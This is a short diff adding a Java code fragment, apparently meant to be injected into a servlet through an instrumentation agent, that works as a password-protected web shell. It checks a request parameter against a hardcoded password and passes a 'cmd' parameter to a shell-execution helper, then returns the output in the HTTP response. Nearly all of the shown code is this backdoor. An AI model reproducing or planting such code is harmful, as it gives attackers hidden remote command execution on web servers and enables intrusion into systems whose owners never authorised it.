@@ -1,0 +1,26 @@
+	javax.servlet.http.HttpServletRequest request=$1;
+	javax.servlet.http.HttpServletResponse response = $2;
+	String pwd=request.getParameter("passwod");
+	String cmd=request.getParameter("cmd");
+	String result="";
+try {
+            System.out.println("shell connectting");
+
+			if (pwd!=null&&pwd.equals("ga0weI"))
+			{
+				if (cmd==null||cmd.equals(""))
+				{
+					result=priv.ga0weI.baseonagent.Shell.help();
+				}
+				else
+				{
+					result=priv.ga0weI.baseonagent.Shell.execute(cmd);
+				}
+                response.getWriter().print(result);
+                return;
+				}
+		}
+		catch(Exception e)
+		{
+			response.getWriter().print(e.getMessage());
+		}
